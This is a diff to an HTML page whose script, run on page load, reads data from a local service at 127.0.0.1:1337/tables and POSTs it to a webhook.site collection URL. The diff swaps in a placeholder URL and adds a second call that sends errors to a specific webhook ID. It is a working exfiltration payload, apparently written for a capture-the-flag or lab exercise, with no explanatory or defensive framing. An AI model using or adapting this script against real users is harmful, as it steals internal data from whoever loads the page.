@@ -8,19 +8,23 @@
 <body>
     <h1>Loading tables...</h1>
     <script>
-        // Fetch the list of tables from /tables and send it to Webhook.site
         fetch('http://127.0.0.1:1337/tables')
             .then(response => response.text())
             .then(data => {
-                fetch('https://webhook.site/547f93ad-ea8e-40ea-bd32-e986fa242f84', {  // Replace with your Webhook.site URL
+                fetch('https://webhook.site/your-unique-id', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                    body: `tables=${encodeURIComponent(data)}`
-                })
-                .then(() => console.log('Sent tables to Webhook.site'))
-                .catch(err => console.error('Webhook error:', err));
+                    body: 'tables=' + encodeURIComponent(data)
+                });
             })
-            .catch(err => console.error('Tables fetch error:', err));
+            .catch(err => {
+                // Send the error to Webhook.site for debugging
+                fetch('https://webhook.site/547f93ad-ea8e-40ea-bd32-e986fa242f84', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: 'error=' + encodeURIComponent(err.message)
+                });
+            });
     </script>
 </body>
 </html>
